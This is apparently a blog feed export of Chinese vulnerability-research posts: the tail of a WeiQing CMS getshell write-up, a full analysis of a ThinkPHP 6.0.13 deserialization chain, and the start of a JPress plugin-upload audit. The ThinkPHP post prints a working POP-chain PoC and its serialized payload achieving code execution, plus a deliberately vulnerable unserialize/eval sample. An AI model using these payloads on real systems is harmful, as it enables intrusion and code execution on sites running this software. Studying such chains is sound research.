class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;no&quot;;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>由于我这边是本地搭建的环境，站点无法注册，导致数据库备份后无cloud_transtoken，不能演示打poc过程，对于实际站点，获取cloud_transtoken后，可基于上述poc获取webshell</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>微擎 CMS：从 SQL 到 RCE   <a href="https://cnpanda.net/codeaudit/863.html">https://cnpanda.net/codeaudit/863.html</a><br>记一次从源代码泄漏到后台获取webshell的过程   <a href="https://fuping.site/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/">https://fuping.site/2020/04/18/WeiQing-CMS-Background-Admin-GetShell/</a><br>代码审计之某通用商城系统getshell过程   <a href="https://mp.weixin.qq.com/s/rSP8LQJpIkP-Ahljkof5sA">https://mp.weixin.qq.com/s/rSP8LQJpIkP-Ahljkof5sA</a><br>微擎路由   <a href="https://www.kancloud.cn/donknap/we7/134629">https://www.kancloud.cn/donknap/we7/134629</a><br>微擎设置开发模式   <a href="https://www.kancloud.cn/tieniuweb/we7web/1431036">https://www.kancloud.cn/tieniuweb/we7web/1431036</a><br>微擎加载器   <a href="https://www.kancloud.cn/donknap/we7/134628">https://www.kancloud.cn/donknap/we7/134628</a><br>离线安装包   <a href="http://www.log4cpp.com/learnother/17.html">http://www.log4cpp.com/learnother/17.html</a>  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-目标熟悉&quot;&gt;&lt;a href=&quot;#0x01-目标熟悉&quot; class=&quot;headerlink&quot; title=&quot;0x01 目标熟悉&quot;&gt;&lt;/a&gt;0x01 目标熟悉&lt;/h1&gt;&lt;p&gt;软件简介：微擎是宿州市微擎云计算有限公司开发的一款免费开源的微信公众号管理系统&lt;/p</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP最新版6-0-13-0day利用链分析</title>
    <link href="http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2024-04-22T11:53:08.000Z</published>
    <updated>2025-08-14T14:06:07.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-ThinkPHP版本梳理"><a href="#0x01-ThinkPHP版本梳理" class="headerlink" title="0x01 ThinkPHP版本梳理"></a>0x01 ThinkPHP版本梳理</h1><p>截止到2022年10月17日<br>6.0.x系列最新版是V6.0.13（2022年07月15日发布）<br>5.1.x系列最新版是V5.1.41（2021年01月12日发布）<br>5.0.x系列最新版是V5.0.24（2019年01月11日发布）  </p><p>作者在2019年02月14日发布V5.2 RC1后，没有再发布过V5.2系列，而是在2019年04月22日发布V6.0.0 RC2，看样子V6.0系列接替了V5.2系列</p><p>thinkphp6及以上，安装需要使用composer</p><h1 id="0x02-Mac下PHP集成环境踩坑"><a href="#0x02-Mac下PHP集成环境踩坑" class="headerlink" title="0x02 Mac下PHP集成环境踩坑"></a>0x02 Mac下PHP集成环境踩坑</h1><p>php集成环境，之前在windows下用phpstudy，自从换了mac，什么都要重新来。。</p><p>首选使用破解版MAMP Pro，但我这边下载后安装报错（后经查阅，安装破解版MAMP Pro可能需要关闭SIP，SIP即macOS的一种保护机制），不想关闭SIP，放弃这个方案，也试过MAMP免费版，但不支持切换php版本，这个不能忍，尝试phpstudy mac版，发现phpstudy mac版支持切换php版本，其他功能界面也和phpstudy windows版基本一致，就用它了</p><p>具体使用phpstudy mac版后发现，启动phpstudy mac版内置的php解释器报错，提示找不到redis.so库，在php.ini中注释掉redis.so库可解决此提醒，but，使用phpstudy内置的php下载composer时又报错，提示缺少openssl库，此时需要自己编译openssl库，太麻烦了，干脆换一个php集成环境吧，找来找去，发现MAMP免费版也可以切换php版本（需要一个小技巧，后面会提到），下载后尝试用内置的php下载安装composer，成功安装composer，OK，就用它了</p><p>mamp免费版切换php版本技巧，进入mamp下php安装目录，由于mamp默认会不显示后面加_x的版本，所以可将其他版本改个名字来切换版本，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221019105719682.png" alt="image-20221019105719682"></p><h1 id="0x03-Mac下ThinkPHP调试环境踩坑"><a href="#0x03-Mac下ThinkPHP调试环境踩坑" class="headerlink" title="0x03 Mac下ThinkPHP调试环境踩坑"></a>0x03 Mac下ThinkPHP调试环境踩坑</h1><p>php开发环境，使用phpstorm 2021.1.4，破解方式参考：<a href="https://github.com/ybdt/pentest-hub/tree/main/%E5%A6%82%E4%BD%95%E6%94%BE%E5%BF%83%E7%9A%84%E7%99%BD%E5%AB%96%E5%9B%9B%E5%A4%A7%E4%B8%BB%E6%B5%81%E8%AF%AD%E8%A8%80IDE">https://github.com/ybdt/pentest-hub/tree/main/如何放心的白嫖四大主流语言IDE</a></p><p>安装composer，参考：<a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></p><p>在mamp的对应php目录下安装composer，然后创建到/usr/local/bin的软连接，创建软连接后，可从任意位置执行composer及php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ln -s /Applications/MAMP/bin/php/php7.1.33/bin/composer.phar /usr/local/bin/composer</span><br><span class="line"></span><br><span class="line">ln -s /Applications/MAMP/bin/php/php7.1.33/bin/php /usr/local/bin/php</span><br></pre></td></tr></table></figure><p>安装指定版本的thinkphp框架</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp5.0 5.0.24</span><br></pre></td></tr></table></figure><p>我这边composer版本是2.2.18，不是最新版2.4.3，想使用composer安装thinkphp6的最新版6.0.13会提示找不到，可是php7.1安装composer最高版本只能是2.2.18，于是改用php7.4安装composer，成功安装到composer 2.4.3，再用composer 2.4.3安装thinkphp 6.0.13，成功安装，真是一波三折，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221019155233012.png" alt="image-20221019155233012"></p><p>然后是php调试环境，mac下想安装xdebug需要先通过homebrew安装php，然后通过pecl安装xdebug，可是这样只能安装php版本对应的xdebug，不能安装指定版本的xdebug，有点烦~</p><p>可从<a href="%5Bhttps://xdebug.org/wizard">https://xdebug.org/wizard</a>中查询当前php版本需要哪个版本的xdebug，结果按照指令安装的时候，发现缺少phpize，官方文档并没有讲述mac下缺少phpize该如何安装，google后发现可能需要编译安装，太麻烦了，想想别的办法，猛地发现，mamp的如下目录自带了编译好的xdebug</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902</span><br></pre></td></tr></table></figure><p>不得不说，集成环境真香~</p><p>修改php.ini，增加如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension=&quot;/Applications/MAMP/bin/php/php7.4.21/lib/php/extensions/no-debug-non-zts-20190902/xdebug.so&quot;</span><br><span class="line">xdebug.remote_enable=1</span><br><span class="line">xdebug.remote_autostart=on</span><br><span class="line">xdebug.remote_log=&quot;/var/log/xdebug.log&quot;</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=&quot;dbgp&quot;</span><br><span class="line">xdebug.idekey=&quot;PhpStorm&quot;</span><br></pre></td></tr></table></figure><p>成功安装了xdebug，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020001654994.png" alt="image-20221020001654994"></p><p>Phpstorm配置过程参见：<a href="https://juejin.cn/post/6934614190548221960">https://juejin.cn/post/6934614190548221960</a></p><p>配置好后，如下图启动<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020094716570.png" alt="image-20221020095242692"></p><p>能看到网页访问停在了断点处<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020094821384.png" alt="image-20221020094821384"></p><p>程序执行停在了断点处<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221020095242692.png" alt="image-20221020095242692"></p><h1 id="0x04-PHP反序列化漏洞及POP链复习"><a href="#0x04-PHP反序列化漏洞及POP链复习" class="headerlink" title="0x04 PHP反序列化漏洞及POP链复习"></a>0x04 PHP反序列化漏洞及POP链复习</h1><p>PHP反序列化漏洞原理：服务端在处理用户传入的序列化数据时，需要调用unserialize()，php中调用unserialize()会触发魔法方法<code>__wakekup()</code>、<code>__destruct()</code>，如果魔法方法中包含了危险函数或间接包含危险函数，则攻击者可构造恶意的序列化数据，在服务端反序列化的时候造成危险函数的执行，</p><p>PHP反序列化POP链原理：由于类反序列化后只包含属性不包含方法，也就是说我们构造的序列化数据只能操纵类的属性，不能操纵方法，只能通过自动调用魔法方法来调用方法，这个时候如果魔法方法中不是直接包含危险函数，就需要向上回溯，一层一层跟踪，也就是所谓的POP链，通常是寻找包含危险函数的同名方法、或者更复杂的，触发各种魔法方法，最终调用危险函数</p><p>详细讲解可参考：<br><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://johnfrod.top/安全/php反序列化漏洞总结/</a><br><a href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p><p>如下是一个存在反序列化漏洞的文件vuln1.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    </span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new L();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class L &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;function action() in class L&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    </span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure><p>由上述Demo可知，如果构造一个Demo类，里面实例化的是类Evil，反序列化时自动调用<code>__destruct()</code>，<code>__destruct()</code>中调用action()，action()中调用危险函数eval，则最终导致代码执行，同时不要忘记将恶意代码赋值给$test2，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class Demo &#123;</span><br><span class="line">    var $test;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new Evil();</span><br><span class="line">        $this-&gt;test-&gt;test2 = &quot;phpinfo();&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line"></span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = new demo();</span><br><span class="line">$data = serialize($d);</span><br><span class="line">echo $data;</span><br><span class="line"></span><br><span class="line">//上述输出</span><br><span class="line">//O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>将上述序列化的输出传给vuln1.php，执行结果如下图</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021113505973.png" alt="image-20221021113505973"></p><h1 id="0x05-ThinkPHP框架复习"><a href="#0x05-ThinkPHP框架复习" class="headerlink" title="0x05 ThinkPHP框架复习"></a>0x05 ThinkPHP框架复习</h1><p>网站搭建好后，我们会访问：<a href="http://localhost:8888/tp6.0.13/public/index.php">http://localhost:8888/tp6.0.13/public/index.php</a>，其实这里的index.php并不是访问的内容，而是一个类似路由的文件，会请求分发到app/controller/Index.php中的方法index，可以看到其内容也是首页中出现的内容<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151524589.png" alt="image-20221021151524589"></p><p>我们对方法index做个修改<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151908240.png" alt="image-20221021151908240"></p><p>可以看到，首页内容也发生了修改<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021151946085.png" alt="image-20221021151946085"></p><p>其实访问 <a href="http://localhost:8888/tp6.0.13/public/index.php">http://localhost:8888/tp6.0.13/public/index.php</a> 相当于访问 <a href="http://localhost:8888/tp6.0.13/public/index.php/Index/index">http://localhost:8888/tp6.0.13/public/index.php/Index/index</a> ，只不过不加的时候，类Index和方法index是作为默认值，如果要访问其他方法，改为其他方法即可</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021152514296.png" alt="image-20221021152514296"></p><p>详细讲解可参考：<br><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037485">https://www.kancloud.cn/manual/thinkphp6_0/1037485</a><br><a href="https://www.kancloud.cn/manual/thinkphp6_0/1037494">https://www.kancloud.cn/manual/thinkphp6_0/1037494</a></p><h1 id="0x06-ThinkPHP最新版6-0-13-0day利用链分析"><a href="#0x06-ThinkPHP最新版6-0-13-0day利用链分析" class="headerlink" title="0x06 ThinkPHP最新版6.0.13 0day利用链分析"></a>0x06 ThinkPHP最新版6.0.13 0day利用链分析</h1><p>截止到2022年10月17日，thinkphp 6.0.x系列最新版是V6.0.13（2022年07月15日发布），08月14日有人提交了一个反序列化利用链，是一个目前尚未修复的0day，下面对它进行一波分析</p><p>先用如下poc打一遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">namespace League\Flysystem\Cached\Storage&#123;</span><br><span class="line">    class Psr6Cache&#123;</span><br><span class="line">          private $pool;</span><br><span class="line">          protected $autosave = false;</span><br><span class="line">          public function __construct($exp)</span><br><span class="line">&#123;</span><br><span class="line">              $this-&gt;pool = $exp;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\log&#123;</span><br><span class="line">      class Channel&#123;</span><br><span class="line">          protected $logger;</span><br><span class="line">          protected $lazy = true;</span><br><span class="line">          public function __construct($exp)</span><br><span class="line">&#123;</span><br><span class="line">               $this-&gt;logger = $exp;</span><br><span class="line">               $this-&gt;lazy = false;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think&#123;</span><br><span class="line">      class Request&#123;</span><br><span class="line">          protected $url;</span><br><span class="line">          public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">              $this-&gt;url = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      class App&#123;</span><br><span class="line">            protected $instances = [];</span><br><span class="line">            public function __construct()</span><br><span class="line">&#123;</span><br><span class="line">                $this-&gt;instances = [&#x27;think\Request&#x27;=&gt;new Request()];</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\view\driver&#123;</span><br><span class="line">      class Php&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\log\driver&#123;</span><br><span class="line">      class Socket&#123;</span><br><span class="line">            protected $config = [];</span><br><span class="line">            protected $app;</span><br><span class="line">            protected $clientArg = [];</span><br><span class="line">            public function __construct()</span><br><span class="line">            &#123;</span><br><span class="line">               $this-&gt;config = [</span><br><span class="line">                  &#x27;debug&#x27;=&gt;true,</span><br><span class="line">                  &#x27;force_client_ids&#x27; =&gt; 1,</span><br><span class="line">                  &#x27;allow_client_ids&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">                  &#x27;format_head&#x27; =&gt; [new \think\view\driver\Php,&#x27;display&#x27;], # 利用类和方法</span><br><span class="line">               ];</span><br><span class="line">               $this-&gt;app = new \think\App();</span><br><span class="line">               $this-&gt;clientArg = [&#x27;tabid&#x27;=&gt;&#x27;1&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $c = new think\log\driver\Socket();</span><br><span class="line">    $b = new think\log\Channel($c);</span><br><span class="line">    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);</span><br><span class="line">    echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//输出如下</span><br><span class="line">O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A2%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A17%3A%22think%5Clog%5CChannel%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00logger%22%3BO%3A23%3A%22think%5Clog%5Cdriver%5CSocket%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00config%22%3Ba%3A4%3A%7Bs%3A5%3A%22debug%22%3Bb%3A1%3Bs%3A16%3A%22force_client_ids%22%3Bi%3A1%3Bs%3A16%3A%22allow_client_ids%22%3Bs%3A0%3A%22%22%3Bs%3A11%3A%22format_head%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A21%3A%22think%5Cview%5Cdriver%5CPhp%22%3A0%3A%7B%7Di%3A1%3Bs%3A7%3A%22display%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A9%3A%22think%5CApp%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A13%3A%22think%5CRequest%22%3BO%3A13%3A%22think%5CRequest%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D%7D%7Ds%3A12%3A%22%00%2A%00clientArg%22%3Ba%3A1%3A%7Bs%3A5%3A%22tabid%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A7%3A%22%00%2A%00lazy%22%3Bb%3A0%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3B%7D</span><br></pre></td></tr></table></figure><p>传入payload，如下图</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021170119781.png" alt="image-20221021170119781"></p><p>根据poc可以看到漏洞代码出现在</p><p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021161431399.png" alt="image-20221021161431399"></p><p>这种框架向上回溯太麻烦了，采用poc+动态debug进行分析，基于之前的thinkphp框架复习，我们在vuln方法中加入漏洞代码，并在反序列化处打上断点，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021170414934.png" alt="image-20221021170414934"></p><p>此处是反序列化入口__destruct()，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221022110935817.png" alt="image-20221022110935817"></p><p>一步一步跟进，跟进到下图所示的语句，可以看到此时autosave值为false，进入save()<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021163201653.png" alt="image-20221021163201653"></p><p>继续跟踪，最终跟到触达代码执行的地方<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021174538053.png" alt="image-20221021174538053"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-ThinkPHP版本梳理&quot;&gt;&lt;a href=&quot;#0x01-ThinkPHP版本梳理&quot; class=&quot;headerlink&quot; title=&quot;0x01 ThinkPHP版本梳理&quot;&gt;&lt;/a&gt;0x01 ThinkPHP版本梳理&lt;/h1&gt;&lt;p&gt;截止到2022年10</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>JPress审计</title>
    <link href="http://example.com/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/"/>
    <id>http://example.com/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/</id>
    <published>2024-04-22T11:28:19.000Z</published>
    <updated>2025-08-14T14:05:32.456Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-目标熟悉"><a href="#0x01-目标熟悉" class="headerlink" title="0x01 目标熟悉"></a>0x01 目标熟悉</h1><p>JPress 是一个使用 Java 开发的、开源免费的建站神器，灵感来源于 WordPress，目前已经有超过 10w+ 的网站使用 JPress 搭建，其中包括多个政府机构，200+上市公司，中科院、红十字会等。</p><p>JPress基于JBoot而不是SpringBoot</p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>依照官方文档：<a href="http://doc.jpress.cn/manual/start.html">http://doc.jpress.cn/manual/start.html</a></p><p>下载项目并解压到指定目录下</p><p>配置好java环境，可参考：<a href="http://doc.jpress.cn/manual/jdk_config.html">http://doc.jpress.cn/manual/jdk_config.html</a></p><p>配置好maven环境，可参考：<a href="http://doc.jpress.cn/manual/maven_config.html">http://doc.jpress.cn/manual/maven_config.html</a></p><p>这里有一个小问题，maven切换到阿里云的源后，执行mvn help:system会报错，暂时使用官方源</p><p>配置好IDEA开发环境，可参考：<a href="http://doc.jpress.cn/manual/idea_environment_config.html">http://doc.jpress.cn/manual/idea_environment_config.html</a></p><p>maven不了解的，可参考：<a href="https://www.cnblogs.com/lenve/p/12047793.html">https://www.cnblogs.com/lenve/p/12047793.html</a></p><p>可通过如下命令启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd jpress</span><br><span class="line">mvn clean package</span><br><span class="line">cd starter/target/starter-4.0</span><br><span class="line">./jpress.sh start</span><br></pre></td></tr></table></figure><p>也可通过IDEA启动，配置好IDEA开发环境后，依照文档定位到文件starter/src/main/java/io.jpress/Starter，点击启动方法main，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226153949475.png" alt="image-20221226153949475"></p><p>成功启动，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226154120204.png" alt="image-20221226154120204"></p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221220104411543.png" alt="image-20221220104411543"></p><p>访问127.0.0.1:8080进入安装界面，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221220104649641.png" alt="image-20221220104649641"></p><p>一路下一步，依照提示操作即可，成功搭建后，使用内网ip访问，前台界面如下</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226154312930.png" alt="image-20221226154312930"></p><p>后台界面如下</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221226154626800.png" alt="image-20221226154626800"></p><p>在 starter/src/main/resources/undertow.txt 中可以修改端口</p><h1 id="0x03-代码审计"><a href="#0x03-代码审计" class="headerlink" title="0x03 代码审计"></a>0x03 代码审计</h1><h2 id="01-通杀最新版的后台插件上传getshell"><a href="#01-通杀最新版的后台插件上传getshell" class="headerlink" title="01 通杀最新版的后台插件上传getshell"></a>01 通杀最新版的后台插件上传getshell</h2><p>登录后台后，查看后台功能，在插件-&gt;安装可以看到能安装插件，想到将恶意代码放入插件中，然后上传插件getshell，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227141058166.png" alt="image-20221227141058166"></p><p>开始动手，首先查看项目目录，能大概猜到，插件目录是jpress-addons，如下图</p><p><img src="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/image-20221227154325574.png" 